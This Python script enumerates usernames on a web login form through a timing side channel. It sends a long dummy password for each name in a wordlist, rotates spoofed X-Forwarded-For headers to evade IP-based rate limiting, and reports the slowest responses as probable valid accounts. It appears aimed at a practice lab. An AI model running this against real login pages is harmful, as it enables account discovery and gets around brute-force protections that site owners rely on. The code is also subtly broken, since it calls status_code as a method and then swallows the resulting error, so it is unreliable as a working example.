import requests
from concurrent.futures import ThreadPoolExecutor
from random import randint

# --- Configuration ---
url = ""
THREADS = 1 # Keep at 1 for timing accuracy
USER_FILE = ""
session=""

def attempt_username(username):
    headers = {
        "Cookie": f"session={session}",
        "Content-Type": "application/x-www-form-urlencoded",
        # Ensures each request looks like it comes from a new IP
        "X-Forwarded-For": f"{randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}"
    }
    
    # Try an exceptionally long password to force a longer hash time
    data = {
        "username": username,
        "password": "q124354567hvcf7654345678uhgcxvbyretyu9876fgh"
    } 
    
    try:
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)
        ms = response.elapsed.total_seconds() * 1000
        s_code = response.status_code()
        if s_code==302:
            print(username)
        print(f"User: {username:<20} | Time: {ms:>8.2f}ms")
        return {"username": username, "time": ms}
    except Exception:
        return None
    

# --- Main Execution ---
try:
    with open(USER_FILE, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]

    print(f"[*] Testing {len(usernames)} usernames. Looking for a timing outlier...")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = list(executor.map(attempt_username, usernames))

    # Remove None values and sort by time (Slowest first)
    valid_results = [r for r in results if r is not None]
    valid_results.sort(key=lambda x: x['time'], reverse=True)

    print("\n" + "="*30)
    print("TOP 3 SLOWEST RESPONSES (Possible Candidates):")
    for res in valid_results[:3]:
        print(f"User: {res['username']} -> {res['time']:.2f}ms")
    print("="*30)

except FileNotFoundError:
    print(f"[!] Error: {USER_FILE} not found.")